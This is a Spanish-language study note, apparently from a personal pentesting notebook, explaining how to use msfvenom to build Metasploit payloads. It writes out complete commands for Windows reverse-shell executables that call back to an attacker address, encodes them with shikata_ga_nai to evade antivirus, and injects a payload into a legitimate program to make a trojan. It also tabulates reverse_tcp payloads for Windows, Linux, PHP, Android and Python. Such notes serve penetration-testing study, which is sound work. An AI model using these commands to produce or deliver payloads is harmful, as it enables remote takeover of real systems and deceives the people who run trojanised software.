# 🐍 Msfvenom: Generador de Payloads
**Msfvenom** es una combinación de dos herramientas antiguas de Metasploit: `msfpayload` (generación) y `msfencode` (ofuscación). Su función principal es crear archivos ejecutables, scripts o líneas de comando que contienen un payload para obtener acceso remoto a un sistema.
## 🛠️ Comandos Básicos de Enumeración
Antes de crear, necesitas saber qué opciones tienes disponibles:

- **Listar Payloads:** `msfvenom --list payloads`
- **Listar Formatos (exe, elf, asp, php, etc.):** `msfvenom --list formats`
- **Listar Arquitecturas (x86, x64, mips, etc.):** `msfvenom --list archs`
- **Listar Encoders:** `msfvenom --list encoders`

## 🏗️ Estructura de un Comando Msfvenom
Para generar un payload básico, necesitas definir la plataforma, la IP/Puerto y el formato de salida.

|**Parámetro**|**Función**|
|---|---|
|**-p**|Selecciona el **Payload** (ej: `windows/x64/meterpreter/reverse_tcp`).|
|**-a**|Define la **Arquitectura** (x86 o x64).|
|**LHOST**|IP del atacante (donde el payload debe "llamar" de vuelta).|
|**LPORT**|Puerto del atacante que está a la escucha.|
|**-f**|**Formato** del archivo de salida (exe, elf, raw, python).|
|**-o**|Ruta y nombre del archivo de salida (**Output**).|
Ejemplo completo (Ejecutable Windows):
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -a x64 -f exe -o shell.exe`

## 🔐 Encoders (Evasión de Antivirus)
Los **Encoders** se utilizan para ofuscar el código del payload, cambiando su firma para intentar evadir detecciones básicas de antivirus (AV).

- **-e**: Especifica el encoder (el más famoso para x86 es `x86/shikata_ga_nai`).
- **-i**: Número de **iteraciones**. Cada vuelta aplica el encoder nuevamente, aumentando la ofuscación pero también el tamaño del archivo.

Ejemplo con Encoder:
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_shell.exe`

## 💉 Inyección en Ejecutables Legítimos
Podemos "esconder" nuestro payload dentro de un programa real (como un instalador de WinRAR o una calculadora) para engañar al usuario.

- **-x**: Especifica el ejecutable legítimo (**plantilla**) que queremos usar.
- **-k**: (**Keep**) Mantiene el funcionamiento original del programa. Sin este flag, el programa se cierra al ejecutar el payload. Con `-k`, el payload se ejecuta como un hilo separado y el programa sigue funcionando normalmente.

**Ejemplo de Inyección (Troyano):**
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -x /usr/share/windows-binaries/plink.exe -k -f exe -o plink_installer.exe`

## 📋 Tabla de Payloads Comunes por Formato

|**Objetivo**|**Payload Sugerido**|**Formato**|
|---|---|---|
|**Windows (64 bit)**|`windows/x64/meterpreter/reverse_tcp`|`.exe`|
|**Linux (Binary)**|`linux/x64/meterpreter/reverse_tcp`|`.elf`|
|**Web (PHP)**|`php/meterpreter/reverse_tcp`|`.php`|
|**Android**|`android/meterpreter/reverse_tcp`|`.apk`|
|**Python Script**|`python/meterpreter/reverse_tcp`|`.py`|

## 🚩 Notas de Experto

- **Arquitectura:** Asegúrate de que el payload, la arquitectura (`-a`) y el formato coincidan (ej: no uses un payload de x64 con una arquitectura declarada de x86).
- **LHOST:** En entornos de red local, usa tu IP de la interfaz `tun0` (VPN) o `eth0`.
- **Manejo de Sesión:** Recuerda que para recibir la conexión de estos payloads, debes tener configurado el `exploit/multi/handler` en Metasploit con los mismos valores de LHOST y LPORT.

---
**Navegación:**
- [[Metasploit]]
- [[Herramientas]]